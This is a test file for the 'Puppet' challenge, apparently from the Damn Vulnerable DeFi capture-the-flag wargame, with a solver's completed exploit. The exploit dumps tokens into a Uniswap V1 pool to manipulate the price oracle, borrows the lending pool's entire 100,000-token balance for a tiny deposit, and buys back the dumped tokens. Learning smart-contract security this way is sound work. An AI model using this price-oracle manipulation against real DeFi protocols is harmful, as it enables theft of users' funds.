const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
        
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );

        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {
        /** In the liquidity pool we have 10ETH : 10DVT which
         *  is the equivalent of 1ETH = 1DVT, since the liquidity pool swaps between
         * two tokens is calculated AFTER the deposit we'll have ""10ETH = 1010DVT""
         * This means that we devaluted the DVT heavily because now ""1 ETH = 100DVT"""
         * THE ONLY REASON WHY WE CAN MANIPULATE THE MARKET BECAUSE I HAVE MORE TOKENS THAN THE LIQUIDITY POOL HAS(ETH/DVT)
        */
        

        // Connect to the contracts with the attackers wallet
        const attackPuppet = this.lendingPool.connect(attacker);
        const attackUniSwap = this.uniswapExchange.connect(attacker);
        const attackToken = this.token.connect(attacker);

        // Helper function to get current token/eth balances
        const logAttackerBalances = async (address, name) => {
            const ethBal = await ethers.provider.getBalance(address);
            const tokenBal =  await attackToken.balanceOf(address);

            console.log(`ETH balance of ${name}: `, ethers.utils.formatEther(ethBal));
            console.log(`Token balance of ${name}:`, ethers.utils.formatEther(tokenBal));
            console.log("");

        }

        await logAttackerBalances(attacker.address, "attacker");
        await logAttackerBalances(attackUniSwap.address, "uniswap");

        // Approve token to swap with Uniswap
        console.log("Approving the Inital Token Balance");
        await attackToken.approve(attackUniSwap.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        console.log("Balance Approved!");


        // 1ETH = 1DVT token
        // 10ETH = 1010 DVT token
        // If I want to buy ETH against DVT the amount of DVT will decrease


        // Check how much ETH we can get based on our TOKEN BALANCE
        const ethPayout = await attackUniSwap.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, 
            {
                gasLimit: 1e6
            });

        console.log("Transfer of 1000 tokens will net", ethers.utils.formatEther(ethPayout)); 
        
        // Deposit DTV and swap it to devalute the DVT token
        console.log("Transferring tokens for ETH");

        await attackUniSwap.tokenToEthSwapInput(
                            ATTACKER_INITIAL_TOKEN_BALANCE, // Exact amount og tokens to transfer
                            ethers.utils.parseEther("9"), // Min return of 9 ETH
                            (await ethers.provider.getBlock('latest')).timestamp * 2,     
        );  

        await logAttackerBalances(attacker.address, "attacker");
        await logAttackerBalances(attackUniSwap.address, "uniswap");

        // Deposit ETH required to gain ALL tokens from the pool
        const deposit = await attackPuppet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        
        console.log("Deposit required:", ethers.utils.formatEther(deposit));

        // Empty the lending pool
        await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, {value : deposit});

        await logAttackerBalances(attacker.address, "attacker");

        const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;

        const ethReq = await attackUniSwap.getEthToTokenOutputPrice(tokensToBuyBack,
            {
                gasLimit: 1e6
            });
        
        console.log(`ETH required for ${tokensToBuyBack} tokens:`, ethers.utils.formatEther(ethReq));

        // Get our original 1000 tokens back by swapping eth
        await attackUniSwap.ethToTokenSwapOutput(
            tokensToBuyBack,
            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
            {
                value: ethReq,
                gasLimit:1e6
            }
        );

        console.log("****FINISHED****");
        await logAttackerBalances(attacker.address, "attacker");
        await logAttackerBalances(attackPuppet.address, "Lender");
        await logAttackerBalances(attackUniSwap.address, "Uniswap");
    
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});